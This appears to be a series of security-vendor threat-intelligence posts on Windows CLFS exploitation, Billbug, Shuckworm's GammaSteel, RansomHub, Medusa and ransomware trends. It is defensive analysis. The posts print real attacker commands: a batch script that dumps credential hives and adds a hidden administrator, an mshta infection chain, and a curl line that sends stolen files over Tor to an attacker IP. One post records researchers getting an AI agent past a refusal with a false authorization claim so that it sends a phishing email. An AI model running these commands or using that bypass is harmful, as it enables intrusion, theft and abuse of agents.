structure previously discussed. To notify the driver that all outstanding file handles for the FILE_OBJECT structure have been closed, the Windows kernel sends an I/O Request Packet (IRP) with the major function code IRP_MJ_CLEANUP to the CLFS driver. When handling this request, the vulnerable versions of the driver deallocate the structure CClfsLogCcb. From the second thread, the exploit calls the DeviceIoControl() API. The internal operations performed by the Windows kernel during that API call are determined by the sequence of operations across the two threads. In a particular scenario, the Windows kernel completes a lookup for the FILE_OBJECT structure referred to by the file handle during the DeviceIoControl() API call before the other thread closes the handle. The Windows kernel then sends an I/O Request Packet (IRP) with the major function code IRP_MJ_DEVICE_CONTROL to the CLFS driver that instructs the driver to perform the actual operation. That specific operation was picked when developing the exploit and involves the structure CClfsLogCcb. However, the Windows kernel does not guarantee the relative ordering of the IRP_MJ_CLEANUP request from the first thread and the IRP_MJ_DEVICE_CONTROL request from the second thread. For example, the IRP_MJ_CLEANUP request may complete first, deallocating the structure CClfsLogCcb, before the IRP_MJ_DEVICE_CONTROL request is sent do the driver. And then, when handling the IRP_MJ_DEVICE_CONTROL request, the CLFS driver uses the memory pointer from the FsContext2 field of the FILE_OBJECT structure, which still refers to the location of the already deallocated structure CClfsLogCcb, to operate on unexpected data. This is abused by the exploit to modify the kernel memory. During the execution of the exploit, two files are created in the path C:\\ProgramData\\SkyPDF. The first file, PDUDrv.blf, is a Common Log File System base log file and is an artifact created during exploitation. The second file, clssrv.inf, is a DLL that is injected into the winlogon.exe process. This DLL has the ability to drop two additional batch files. The first batch file, called servtask.bat, is stored in the “C:\\ProgramData” folder. This file is used to elevate privileges and dump the SAM, SYSTEM, and SECURITY Registry hives and to create a new user named LocalSvc and add it to the Administrator group. mkdir C:\\\\ProgramData\\\\Events & echo Yes | reg save hklm\\\\sam C:\\\\ProgramData\\\\Events\\\\Errors.evt & echo Yes | reg save hklm\\\\security C:\\\\ProgramData\\\\Events\\\\Logs.evt & echo Yes | reg save hklm\\\\system C:\\\\ProgramData\\\\Events\\\\Jobs.evt & net user /add LocalSvc Dc_34%gfE62cvsa & powershell.exe \\\"Add-LocalGroupMember -SID \\\"S-1-5-32-544\\\" -Member \\\"LocalSvc\\\"\\\" & net localgroup Administrators LocalSvc /add & reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\\" /v LocalSvc\" /d 0 /t REG_DWORD & icacls C:\\\\ProgramData\\\\Events /grant Everyone:F /inheritance:e /T & call C:\\\\ProgramData\\\\cmdpostfix.bat & del C:\\\\ProgramData\\\\Events\\\\Errors.evt & del C:\\\\ProgramData\\\\Events\\\\Logs.evt & del C:\\\\ProgramData\\\\Events\\\\Jobs.evt & del C:\\\\ProgramData\\\\Events\\\\Tasks.evt & del C:\\\\ProgramData\\\\Events\\\\Tmp.evt & del C:\\\\ProgramData\\\\Events\\\\out.zip & schtasks /Create /F /xml C:\\\\ProgramData\\\\CacheTask.xml /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask & rmdir C:\\\\ProgramData\\\\Events & del C:\\\\ProgramData\\\\CacheTask.xml & del C:\\\\ProgramData\\\\cmdpostfix.bat & del C:\\\\ProgramData\\\\servtask.bat The second batch file, named cmdpostfix.bat, is also created in the “C:\\ProgramData” folder and is used to clean up the artifacts created by the exploit: del C:\\\\ProgramData\\\\SkyPDF\\\\PDUDrv.blf & del C:\\\\ProgramData\\\\SkyPDF\\\\ClsSrv.inf & rmdir C:\\\\ProgramData\\\\SkyPDF Ultimately, the exploit executes the aforementioned batch files via the following commands: The exploit (or similar exploits) may have been in the hands of multiple actors prior to the patching of CVE-2025-29824. When patching the vulnerability, Microsoft said that it had beenexploited against a “small number of targets,” including organizations in the U. S., Venezuela, Spain, and Saudi Arabia. Microsoft said that the exploit had been deployed by the PipeMagic malware, which is often used by a group called Storm-2460 to deploy ransomware. The nature of the exploitation by Storm-2460 appears different from the Balloonfly-linked activity discovered by Symantec. Microsoft said that the exploit had been launched in memory from a dllhost.exe process. The exploitation discovered by Symantec was not fileless. While the use of zero-day vulnerabilities by ransomware actors is rare, it is not unprecedented. Last year Symantec found evidencethat attackers linked to the Black Basta ransomware may have been exploiting a recently patched Windows privilege escalation vulnerability (CVE-2024-26169) as a zero-day. That vulnerability was patched on March 12, 2024, and, at the time, Microsoft said there was no evidence of its exploitation in the wild. However, analysis of an exploit tool revealed evidence that it could have been compiled prior to patching, meaning at least one group may have been exploiting the vulnerability as a zero-day.

    "text": "The Billbug espionage group (aka Lotus Blossom, Lotus Panda, Bronze Elgin) compromised multiple organizations in a single Southeast Asian country during an intrusion campaign that ran between August 2024 and February 2025. Targets included a government ministry, an air traffic control organization, a telecoms operator, and a construction company. In addition to this, the group staged an intrusion against a news agency located in another country in Southeast Asia and an air freight organization located in another neighboring country. The attacks involved the use of multiple new custom tools, including loaders, credential stealers, and a reverse SSH tool. The campaign is one of the findings documented in the Threat Hunter Team’s new whitepaper -Relentless Force: China-linked Espionage Actors The activity appears to be acontinuation of a campaign first documented by Symantec in December 2024, where multiple high-profile organizations in Southeast Asian countries were targeted. While it was clear that Chinese actors were behind the attacks, attribution to a single actor could not be determined. However,a recent blog by Cisco Talosdetailing recent Billbug activity contained indicators of compromise (IOCs) used in this campaign, indicating that it was the work of Billbug. In several of the intrusions, the attackers used legitimate software from Trend Micro and Bitdefender to load malicious loaders, using the technique known as DLL sideloading. One of the legitimate executables used for sideloading was a Trend Micro binary named tmdbglog.exe (SHA246: f9036b967aaadf51fe0a7017c87086c7839be73efabb234e2c21885a6840343e). This was used to sideload a malicious DLL named tmdglog.dll (SHA256: b75a161caab0a90ef5ce57b889534b5809af3ce2f566af79da9184eaa41135bd). Analysis of tmdglog.dll revealed that it was a loader that read, decrypted, and executed the contents of the file C:\\Windows\\temp\\TmDebug.log. It then logged the execution progress to C:\\Windows\\Temp\\VT001.tmp. Another legitimate executable used was a Bitdefender binary named bds.exe (SHA256: 2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924). This was used to sideload a malicious DLL named log.dll (SHA256: 54f0eaf2c0a3f79c5f95ef5d0c4c9ff30a727ccd08575e97cce278577d106f6b). Analysis of log.dll concluded that it was another loader which read and decrypted the contents of the file winnt.config. It then started the process C:\\Windows\\system32\\systray.exe and injected the decrypted contents to it. Several variants of log.dll were used in the campaign, but only one was retrieved for analysis. The same Bitdefender binary was also used to sideload a file named sqlresourceloader.dll, which was also not retrieved. It is unknown if this is related to the loader analyzed or a different tool. The attackers also used a new variant of the Sagerunex backdoor, a custom tool that is exclusively used by Billbug. The variant (SHA256: 4b430e9e43611aa67263f03fd42207c8ad06267d9b971db876b6e62c19a0805e) appears to be related to variants of Sagerunex documented by Cisco in February 2025. As documented by Cisco, the attackers created a persistence mechanism by modifying the registry to ensure that it would run as a service. Among the new tools deployed were two designed to steal credentials from the Chrome web browser. Deployed tools included: The attackers deployedthe publicly available Zrokpeer-to-peer tool, using thesharing function of the toolin order to provide remote access to services that were exposed internally. Another legitimate tool used was called datechanger.exe (SHA256: b337a3b55e9f6d72e22fe55aba4105805bb0cf121087a3f6c79850705593d904). It is capable of changing timestamps for files, presumably to muddy the waters for incident analysts. Active since at least 2009, Billbug has largely focused on Southeast Asia, targeting governments and military organizations in particular. The group first came to public attention in 2015 whenPalo Alto published a reporton its activities in Southeast Asia, linking it to over 50 different attacks over a period of three years. Its campaigns used spear-phishing emails and convincing lure documents to deliver the custom Trensil (aka Elise) Trojan. In 2018, Symantecpublished an investigation on the group’s activity, detailing an attack on a large telecoms operator in Southeast Asia. The attackers used PsExec to install a previously unknown piece of malware (Infostealer. Catchamas). The discovery of this attack led to the discovery of further attacks against the communications, geospatial imaging, and defense sectors, both in the U. S. and Southeast Asia. During that investigation, Symantec referred to the actor as Thrip, but we subsequently determined that Thrip and Billbug were most likely the same group and began tracking all activity under the Billbug name. In 2019,Symantec published another report on the group, detailing the use of two previously unseen backdoors known as Hannotog (Backdoor. Hannotog) and Sagerunex (Backdoor. Sagerunex). Targets of this campaign included at least 12 organizations in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. In addition to military targets, the group also attacked organizations in the maritime communications, media, and education sectors. Billbug remained active in subsequent years. In November 2022,Symantec published new research on the group, highlighting an attack on a digital certificate authority in an Asian country. The targeting of a certificate authority was notable because the attackers could have accessed certificates and used them to sign malware, helping them to evade detection. Compromised certificates could also potentially be used to intercept HTTPS traffic.

    "text": "Shuckworm’s relentless focus on Ukraine has continued into 2025, with the group targeting the military mission of a Western country based in the Eastern European nation. This first activity in this campaign occurred in February 2025, and it continued into March. The initial infection vector used by the attackers appears to have been an infected removable drive. In this campaign, the attackers appear to be using an updated version of their GammaSteel tool. GammaSteel is an infostealer that exfiltrates data from victim networks. The attackers are seen using various methods for data exfiltration, including using thewrite.asweb service for possible exfiltration. They are also seen using cURL alongside Tor as a backup method of data exfiltration. cURL is anopen-source command-line toolthat can be used to transfer data to and from a server and is frequently leveraged by malicious actors. This campaign also seems to demonstrate a move by Shuckworm from using a lot of VBS scripts to using more PowerShell-based tools, particularly later in its attack chain. It is likely leveraging PowerShell for obfuscation and also because it allows it to store scripts in the registry. GammaSteel was deployed following a complex, multi-staged attack chain, with frequent use of obfuscation. The process was most likely designed to minimize the risk of detection. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked espionage group that has almost exclusively focused its operations on government, law enforcement, and defense organizations in Ukraine since it first appeared in 2013. It is believed that Shuckwormoperates on behalf of the Russian Federal Security Service (FSB). The initial infection in this campaign appeared to occur on February 26 with the creation of a Windows Registry value under theUserAssistkey that indicates the infection may have started from an external drive and an LNK file namedD:\\files.lnk. The UserAssist registry key stores the applications, files, links, and other objects accessed by the user through Windows Explorer stored in a ROT13 format. HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count\\Q:\\svyrf.yax After that event, explorer.exe launched a mshta.exe process executing the following command: \"C:\\Windows\\System32\\mshta.exe\" javascript:eval('w=new%20ActiveXObject(\"WScript. Shell\");w.run(\"explorer files\");w.run(\"wscript.exe //e:vbScript \\~.drv\");window.close()') Then, the following commands were executed: \"C:\\Windows\\System32\\wscript.exe\" //e:vbScript ~.drv \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER. DAT. TMContainer00000000000000000001.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER. DAT.

DAT. TMContainer00000000000000000001.regtrans-ms c:\\users\\public\\ntuser.dat.tmcontainer00000000000000000002.regtrans-ms The first file (NTUSER. DAT. TMContainer00000000000000000001.regtrans-ms) is used to contact the command and control (C&C) server and stay in constant contact with it. First, it searches for a ping record with a WMI query: \"Select * From Win32_PingStatus where Address = 'mil.gov.ua'\" to the address \"mil.gov.ua\", If there is no ping record or the ping is not successful, it will finish execution. It then checks if the C&C server address is stored in the value: HKEY_CURRENT_USER\\\\Console\\\\WindowsUpdates If not, it will run different methods to obtain the final C&C server address. The script leverages different legitimate services to try to resolve the C&C server, including: In this instance, the attackers were able to obtain a C&C server address and contact it: From hxxps://telegra[.]ph/Mark-01-20-5 we also found the following C&C server: The C&C server is similar to others that have been used by Shuckworm in the past, as shown in aninvestigation by Recorded Futurewhere the group leveraged Cloudflare tunnels for their C&C infrastructure. From t[.]me/futar123 we also found the C&C 107.189.19[.]137 from recovered text: The second file mentioned previously (NTUSER. DAT. TMContainer00000000000000000002.regtrans-ms) appears to be designed to modify the following registry keys to not show hidden and system files: HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt It then starts to infect any removable drives and network drives by creating shortcut files (.lnk) for every folder to execute the first malicious mshta.exe command (wscript.exe //e:vbScript ~.drv)and hide the folder.

The first script appears to be a reconnaissance tool, which is used to create a screenshot of the machine, run a systeminfo command, get the name of the security software running on the machine, get the available space from all disks, get the VolumeSerialNumber, the directory tree of the Desktop folder, a list of files in the Desktop folder, and a list of the running processes.

This tool enumerates all the files in the following folders: It exfiltrates files that match a hardcoded extension list: It ignores folders that contain the following strings: It uses certutil.exe to get the MD5 of the exfiltrated file and possibly store it as a file, which is something previous versions of the GammaSteel malware also did. \"C:\\Windows\\system32\\certutil.exe\" -hashfile \"[REDACTED].txt\" MD5 This version of GammaSteel tries to exfiltrate the files via a PowerShell web request, but if it fails, as a fallback method, it uses cURL with a Tor network proxy to obfuscate the origin IP: \"C:\\Windows\\system32\\curl.exe\" -x socks5://127.0.0.1:9050 -v -k -F o2PVasTpH2AxGgiYBSjb=[REDACTED] -F AWpCbqMhrFvHx4QJkAXlj=@[REDACTED].pdf https://85.92.111.12 The first post parameter contains some information regarding the machine, like the hostname, the drive serial number, and the path of the exfiltrated file: jhEOKsGyR07pNfM::1000::PAikOnBfhsr::[REDACTED].pdf::Bqf4wlnsrc::22.02.2025 14:18:24::mU0p1uNxlLvd::508383::GHCcfPBq1NwgZ::boML6spmjPF::Ti5vCm4hcu::[REDACTED]**2863E630::S3apqcC4J20QH It also contained some incomplete code that seems to leverage the web servicewrite.asto possibly exfiltrate some information from the computer: $REGWeqlhlmtvuskihNeRgib = \"https://write.as/api/posts\"; $XUqKFBjm5dwgqh5aljmHuTC = '{{\"body\": \"This is a post.\", \"title\": \"My First Post\"}}'; $aFKGHf31o2g4jrm00nkAQdv = @{{\"Content-Type\" = \"application/json\"}}; $KMTPQV1jeau2lslqmzcNPyG = Invoke-WebRequest -Uri $REGWeqlhlmtvuskihNeRgib -Method \"POST\" -Body $XUqKFBjm5dwgqh5aljmHuTC -Headers $aFKGHf31o2g4jrm00nkAQdv; To obtain persistence, the malware registers itself in the Run registry key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[USERNAME] This attack does mark something of an increase in sophistication for Shuckworm, which appears to be less skilled than other Russian actors, though it compensates for this with its relentless focus on targets in Ukraine. While the group does not appear to have access to the same skill set as some other Russian groups, Shuckworm does now appear to be trying to compensate for this by continually making minor modifications to the code it uses, adding obfuscation, and leveraging legitimate web services, all to try lower the risk of detection. This campaign also demonstrates that the group remains laser-focused on targeting entities within Ukraine for espionage purposes.

    "text": "At least one affiliate of the RansomHub ransomware-as-a-service (RaaS) has begun using a new custom backdoor in attacks. The malware (Backdoor. Betruger) is a rare example of a multi-function backdoor, seemingly developed specifically for use in carrying out ransomware attacks. The use of custom malware other than encrypting payloads is relatively unusual in ransomware attacks. Most attackers rely on legitimate tools, living off the land, and publicly available malware such as Mimikatz and Cobalt Strike. Ransomware groups do on occasion develop custom tools, mostly for data exfiltration, such as theCoreid group’s Infostealer. Exmatteror theHecamede group’s Infostealer. Exbyte. Analysis of the Betruger backdoor revealed that it contained functionality that is usually found in multiple pre-ransomware tools. This included: File names used for versions of this malware included mailer.exe and turbomailer.exe. The backdoor contains no mailing functionality. It is possible the attackers used the name in order to masquerade as a legitimate application. The functionality of Betruger indicates that it may have been developed in order to minimize the number of new tools dropped on a targeted network while a ransomware attack is being prepared. Betruger is just one of a range of tools that have been used by RansomHub affiliates in recent months. Like a growing number of ransomware attackers, some have begun using tools that leverage the Bring Your Own Vulnerable Driver (BYVOD) technique to disable security solutions, most notably EDRKillshifter. Attackers also leveraged several vulnerabilities, including a Windows Privilege Escalation exploit (CVE-2022-24521) and a Veeam exploit that leaks credentials for backups (CVE-2023-27532). Other tools leveraged in recent attacks include: The Betruger backdoor was deployed in several recent RansomHub attacks, suggesting that it is available to at least one affiliate. RansomHub is a RaaS operation run by a cybercrime group Symantec calls Greenbottle. Active since February 2024, Greenbottle has quickly grown RansomHub, becoming themost prolific ransomware operation by the third quarter of 2024, responsible for the highest number of claimed attacks. The group has reportedly won over many affiliates by offering them better terms compared to rival operations, such as a great percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut.

    "text": "The introduction of AI agents may provide further opportunities for exploitation by attackers. A year ago, when we briefed organizations on the risks posed by AI, we said that while the existing Large Language Model (LLM) AIs are already being put to use by attackers, they are largely passive and could only assist in performing tasks such as creating phishing materials oreven writing code. At the time, we predicted that agents would eventually be added to LLM AIs and that they would become more powerful as a result, increasing the potential risk. Now agents, such as OpenAI’s Operatorwhich was launched as a research preview on January 23, are beginning to be introduced. Agents have more functionality and can actually perform tasks such as interacting with web pages. While an agent’s legitimate use case may be the automation of routine tasks, attackers could potentially leverage them to create infrastructure and mount attacks. In order to establish whether an agent could be used could carry out an attack end-to-end with minimal human intervention, researchers at Symantec’s Threat Hunter Team asked OpenAI’s Operator to: For our target, we chose one of our team members, Dick O’Brien. Our first attempt failed quickly as Operator told us that it was unable to proceed “as it involves sending unsolicited emails and potentially sensitive information. This could violate privacy and security policies.” However, tweaking the prompt to state that the target had authorized us to send emails bypassed this restriction, and Operator began performing the assigned tasks. Operator was able to quickly find our target’s name, which is not surprising since Dick’s name and job title appear a lot online, both on our own website and in the media. Finding his email address took a little longer because it isn’t publicly available, but Operator succeeded using some deduction by analyzing other Broadcom email addresses. Once it had established the email address, it drafted the PowerShell script. It opted to find and installa text editor plugin for Google drive. The Google account we used for the demonstration was created specifically for the purpose and with the display name “IT Support”. Interestingly, Operator visited several web pages about PowerShell prior to creating the script, seemingly to get some guidance on how it could be done. The final step was to draft and send the email. Although only given minimal guidance in the prompt, Operator managed to create a reasonably convincing email, urging Dick to run the script. Although we told Operator we had been authorized to send the email, it required no proof of authorization and sent the email even though “Eric Hogan” is a fictitious person. Agents such as Operator demonstrate both the potential of AI and some of the possible risks. While agents may ultimately enhance productivity, they also present new avenues for attackers to exploit. The technology is still in its infancy, and the malicious tasks it can perform are still relatively straightforward compared to what may be done by a skilled attacker. However, the pace of advancements in this field means it may not be long before agents become a lot more powerful. It is easy to imagine a scenario where an attacker could simply instruct one to “breach Acme Corp” and the agent will determine the optimal steps before carrying them out. This could include writing and compiling executables, setting up command-and-control infrastructure, and maintaining active, multi-day persistence on the targeted network. Such functionality would massively reduce the barriers to entry for attackers. For the latest protection updates, please visit theSymantec Protection Bulletin.

The Medusa ransomware is reportedly operated as a ransomware-as-a-service (RaaS) by a group Symantec’s Threat Hunter Team tracks as Spearwing. Like the majority of ransomware operators, Spearwing and its affiliates carry out double extortion attacks, stealing victims’ data before encrypting networks in order to increase the pressure on victims to pay a ransom. If victims refuse to pay, the group threatens to publish the stolen data on their data leaks site. Spearwing has amassed hundreds of victims since it first became active in early 2023. The group has listed almost 400 victims on its data leaks site in that time, and the true number of victims is likely to be much higher. Ransoms demanded by attackers using the Medusa ransomware have ranged from $100,000 up to $15 million. As we discussed in ourrecent Threat Hunter whitepaper on the topic of ransomware, the decline of well-known names likeNoberusandLockBitfollowing law enforcement action in 2023 and 2024 left a gap for the rise of new names on the ransomware landscape. Among those names are RansomHub and the longer established Qilin. With its continuing increase in activity, it seems that Medusa could also be taking advantage of this gap in the ransomware scene. This is a different ransomware to the older MedusaLocker ransomware and Spearwing is not believed to have any link to that ransomware. It is believed that Spearwing and its affiliates mostly gain access to victim networks by exploiting unpatched vulnerabilities in public-facing applications, particularly Microsoft Exchange Servers. It hasalso been reportedthat the group has gained access to some victims by hijacking legitimate accounts, possibly utilizing initial access brokers for infiltration. In several of the Medusa attacks observed by Symantec it wasn’t possible to definitively determine how the attackers had gained initial access to victims’ networks, meaning an infection vector other than exploits could have been used. A variety of living-off-the-land and dual-use tools have been used in attack chains where the Medusa ransomware has been deployed. Once they have gained access to a victim network, attackers using Medusa typically use remote management and monitoring (RMM) software such as SimpleHelp or AnyDesk for further access and to download drivers. Mesh Agent is another remote access tool that has been seen in several Medusa ransomware attacks. Mesh Agent has been appearing more frequently in ransomware attack chains in recent times. Attackers using Medusa often use the Bring Your Own Vulnerable Driver (BYOVD) technique in attacks, where attackers will deploy a signed vulnerable driver to the target network, which they then exploit to disable security software and evade detection. BYOVD is a technique that has been increasingly used in ransomware attack chains over the last two years. In almost all Medusa attacks, KillAV and associated vulnerable drivers are used in this part of the attack chain to download drivers and disable security software. The use of the legitimate RMM software PDQ Deploy is another hallmark of Medusa ransomware attacks. It is typically used by the attackers to drop other tools and files and to move laterally across the victim network. Symantec researchers observed the same file path being used with PDQ Deploy to deploy Medusa in almost two-thirds of the Medusa ransomware attacks we investigated in the last year (see Box 1). Other tools used by Spearwing and its affiliates include Navicat, a tool used to access and run database queries, which is likely used by the attackers to search for and copy relevant data for exfiltration. RoboCopy is another tool that has been used by Medusa attackers in a similar fashion, while attackers using Medusa have also been seen using Rclone for data exfiltration. Attackers have also commonly used network scanners like NetScan as part of their attack chain, while they have also used various tools for credential dumping and to delete shadow copies from victim machines. The tactics, techniques, and procedures (TTPs) used by attackers deploying Medusa have remained consistent since it became active in 2023, with PDQ Deploy, the use of remote access clients, and the BYOVD technique to disable security software being particular hallmarks of Medusa ransomware attack chains. The consistency of the TTPs used in Medusa attacks does raise the question as to whether Spearwing is truly operating as a RaaS. The consistency of the tactics may indicate a few things: It is difficult to say which one of the above might apply to Spearwing’s activity, but it seems that the group doesn’t necessarily operate as a “typical” RaaS that works with a lot of affiliates who may use varying TTPs. See below for brief descriptions of some of the tools most used in Medusa attacks: The .medusa extension is added to encrypted files and a ransom note named! READ_ME_MEDUSA!!!.txtis dropped on encrypted machines. Medusa can also delete itself from victim machines once the ransom is executed, which makes it more difficult for those investigating these ransomware attacks. The ransom demanded by the group varies depending on the victims. Victims are given 10 days to pay and are charged $10,000 per day if they want to extend this deadline. The attackers provide screenshots of stolen data to prove that they have compromised victims' networks. If victims fail to pay, Spearwing will publish the stolen data on its leaks site. While there is no link between Medusa and MedusaLocker, in a relatively early Medusa attack, in June 2023, attackers deploying Medusa used drivers that were related to ones previously used in a BlackCat (aka Noberus) attack described by Trend Micro. It wasn’t clear if those drivers were publicly available, or if these two instances pointed to a sharing of tools or affiliates by Medusa and BlackCat. No further evidence has appeared to suggest links between the two groups, though it is possible that they may have affiliates or members in common. Like most targeted ransomware groups, Spearwing tends to attack large organizations across a range of sectors. Ransomware groups tend to be driven purely by profit, and not by any ideological or moral considerations. Medusa has been publicly documented as demanding ransoms from healthcare providers and non-profits, as well as targeting financial and government organizations. In an attack investigated by Symantec’s Threat Hunter team in January 2025, Medusa was used to target a healthcare organization in the U. S., where it infected several hundred machines. The initial access vector used in this attack is not known. The first attacker activity occurred on this network four days before the ransomware was deployed. Once the attacker was on the victim network they staged multiple tools for persistence, lateral movement, and to impair defenses. Most of the tools were staged under theCSIDL_PROFILE\\documents folder. Some of the early attacker activity on this network included: Executing VSS admin to create shadow copies: Accessing ntds.dit for credential dumping. Installing SimpleHelp and Mesh Agent onto victim machines: Dropping AVKiller and a driver under the documents folder on a machine. The attackers used the known POORTRY driver, as well as one unknown driver, for the purposes of killing security software during this attack: On the day of the ransomware attack, Rclone was deployed on the victim network for data exfiltration. The attackers used a renamed version of Rclone -lsp.exe. Rclone was found under: On the day the ransomware was deployed, the attacker switched to another machine and started staging tools. The attacker used PsExec to execute commands on this machine remotely. It executed the following commands on this machine: The attacker then dropped and installed SimpleHelp: They then attempted to create a shadow copy of the C drive but used an incorrect command. This is notable as it points to hands-on-keyboard activity, rather than this being an automated attack: The attacker then corrected the command and executed again: The attacker then dumped the ntds.dit file, before deleting the shadow copy: They then dropped and installed AnyDesk, and used this to download PDQ Deploy and PDQ Inventory onto the machine: The attacker then opened an RDP session to another machine, and this is the last activity that occurred on this machine. On the other machine, the attacker dropped PDQ Deploy, PDQ Inventory, and SimpleHelp under the same directory, before PDQ Deploy and PDQ Inventory were installed under the programs directory and SimpleHelp under the common appdata directory. The attacker used PDQ Inventory to get an inventory of the endpoints on the network. PDQ Deploy then used this information to deploy the AVKiller binary and driver under the Windows directory to all the endpoints and execute it. The attacker then used PDQ Deploy to transfer the ransomware binary and execute it. The ransomware had the file namegaze.exe. The ransomware didn’t encrypt files with the following extensions: It also didn’t encrypt content in the following folders: The ransomware contained an encoded list of the services and processes it wanted to terminate. It used the key 0x2e to decode the strings and use them withnet stop<service> & taskkill /F /IM <process> /T. The ransomware dropped its ransom note—! READ_ME_MEDUSA!!!.txt—into every directory it encrypted. The ransomware was then able to delete itself once it was executed. Medusa has multiple arguments that perform various tasks. The list of accepted arguments for the ransomware used in this attack can be seen in Box 2. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "Ransomware attacks continued to trend upwards in 2024, rising by 3% compared to 2023, underlining the resilience of this particular cyber threat. This increase occurred despite significant disruption in the ransomware space in 2024, and a dip in attacks in the first quarter of the year. Two of 2023’s leading ransomware operations,LockBitandNoberus, were subjects of law enforcement disruptions in late 2023 and early 2024, which did cause an initial decline in ransomware activity early in the year. However, activity in the space rebounded strongly in the second half of 2024. When it comes to the tactics, techniques, and procedures (TTPs) leveraged by ransomware actors, living-off-the-land and dual-use tools remain the most frequently seen tools in ransomware attack chains. Exfiltrating data in so-called double extortion attacks and disabling security software before deploying payloads are now strong focuses of ransomware actors and are two things we see frequently in ransomware attack chains prior to the ransomware being deployed. A technique called Bring Your Own Vulnerable Driver (BYOVD) has become increasingly popular among ransomware attackers over the last two years for disabling security software. Also notable over the past year or so is an apparent shift in power from ransomware operators to affiliates, with ransomware operators now offering generous terms seemingly in order to attract the best affiliates. This trend was evident in the approaches taken by the operators of two of the most active ransomware families in 2024, RansomHub and Qilin. The ability of ransomware operators to pivot and rebound their activity even in the face of significant pressure from law enforcement and disruptions underlines the resilience of a threat that has remained one of the biggest issues on the cybercrime landscape for many years. Some of the recent notable trends observed on the ransomware landscape are detailed in this blog. More details about all these trends and the ransomware landscape in general can be found in the Symantec Threat Hunter Team’s latest whitepaper:Ransomware 2025: A Resilient and Persistent Threat. One of the biggest ransomware stories of 2024 was the emergence of Greenbottle, the operators of the RansomHub ransomware-as-a-service (RaaS). RansomHub first appeared in February 2024, and by the third quarter of the year, it was one of the most prominent ransomware operations, responsible for the highest number of claimed attacks in that quarter. When RansomHub first appeared,initial analysis by Symantecfound that the payload was a development of an older ransomware family known as Knight. Source code for Knight (originally known as Cyclops) wasoffered for sale on underground forums in February 2024after Knight’s developers decided to shut down, so it is possible that other actors bought the Knight source code and updated it before launching RansomHub. The group has reportedly become popular with many affiliates because it offers better terms compared to rival operations, such as a greater percentage of ransom payments and a payment model where the affiliate is paid by the victim before passing on the operator’s cut. Attackers deploying RansomHub have been seen gaining initial access to victim networks by exploiting known vulnerabilities such as the Zerologon vulnerability (CVE-2020-1472), CitrixBleed (CVE-2023-3519), Fortinet FortiOS (CVE-2023-27997), Java OpenWire protocol marshaller (CVE-2023-46604), and Confluence (CVE-2023-22515). Attackers also used several dual-use tools before deploying the ransomware, including Atera and Splashtop, which were used to facilitate remote access, while NetScan was used to likely discover and retrieve information about network devices. Also notable is that RansomHub’s rise came at the same time as the decline of one of the biggest names on the ransomware landscape, LockBit. LockBit, which is operated by a group Symantec tracks as Syrphid, has been active on the ransomware scene since 2019 and has been one of the biggest names on the ransomware landscape in that time. However, Syrphid was disrupted by multiple law enforcement operations in 2024, and this impacted its activity levels. The group was first targeted by aninternational law enforcement operationin February 2024, although it remained active afterward. However, in May 2024, the group's alleged ringleader, Dimitry Khoroshev (aka LockBitSupp),was also indicted in the U. S. This second law enforcement blow seemed to have a more significant impact on LockBit’s activity. While it remained the largest ransomware operation by number of claimed attacks in 2024, you can see a distinct change in trends in the second half of the year, as RansomHub started to dominate and LockBit activity steeply declined (See Figure 2). It is possible that the combined effects of the two law enforcement operations led to a loss of trust among LockBit affiliates, particularly since authorities indicated they had collected information that could identify affiliates. WhileFigure 2indicates a decline in LockBit activity, it is notable that in December 2024, an individual claiming to represent the LockBit ransomware gang began promoting LockBit 4.0, announcing that the newest iteration of the malware would belaunched in February. Symantec’s Threat Hunter Team has observed LockBit 4.0 being deployed in attacks since then. The attackers used a publicly available Windows password recovery tool and a Veeam credential stealer. They also used WMI to stop services and NetSh to enable RDP. It will be interesting to see if the launch of LockBit 4.0 indicates a resurgence of activity from Syrphid, or if other ransomware operators will continue to dominate in 2025. Another notable ransomware family in 2024 was Qilin. Qilin, which first appeared in 2022, is operated by a group Symantec tracks as Stinkbug. According to the U. S. Department of Health and Human Services, the group likely originated in Russia and spent time expanding in 2023, recruiting affiliates on underground forums. This recruitment drive appears to have paid off as Qilin grew to be the fourth biggest ransomware operation by the end of 2024, behind LockBit, RansomHub, and the long-established Play. Like RansomHub, the generous terms that Stinkbug offers Qilin affiliates appear to be a main factor in its success. Affiliates reportedly earn 80% of any ransom payment, rising to 85% for ransoms above $3 million. Qilin, which was initially written in Go but later written in Rust, is one of a growing number of ransomware threats capable of targeting multiple platforms, including Windows, Linux, and ESXi. In June 2024, Stinkbugclaimed responsibility for a ransomware attack that disrupted services at multiple hospitals across Londonin an incident that was declared “critical” by the National Health Services (NHS) London. In October 2024, Stinkbug updated the Qilin payloadto add a number of features to enhance its capabilities. The new version, dubbed Qilin. B, added enhanced encryption with the use of AES-256-CTR with AES-NI when used on machines that support hardware-accelerated encryption, making the encryption process considerably faster. It also features enhanced evasion techniques, including the termination of processes related to security, database, and backup services. To hinder recovery, it also deletes Volume Shadow Copies, logs, and its own binary after the encryption process is finished. This enhancement of the ransomware’s features may serve to make it even more popular among affiliates and see it used even more widely by attackers in 